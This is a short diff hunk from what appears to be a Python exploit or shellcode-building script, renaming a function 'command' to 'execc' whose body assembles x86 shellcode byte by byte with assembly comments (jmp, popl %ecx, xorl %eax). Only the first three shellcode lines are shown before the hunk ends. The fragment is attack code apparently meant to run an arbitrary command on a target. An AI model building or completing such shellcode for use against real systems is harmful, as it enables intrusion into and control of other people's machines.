@@ -26,7 +26,7 @@ main()
 
 #Must be test ..
 
-def command( command):
+def execc( command):
 	shellcode =  r"\xeb\x25"             #/* jmp     <_shellcode+39>         */
 	shellcode += r"\x59"                 #/* popl    %ecx                   */
 	shellcode += r"\x31\xc0"             #/* xorl    %eax,%eax              */
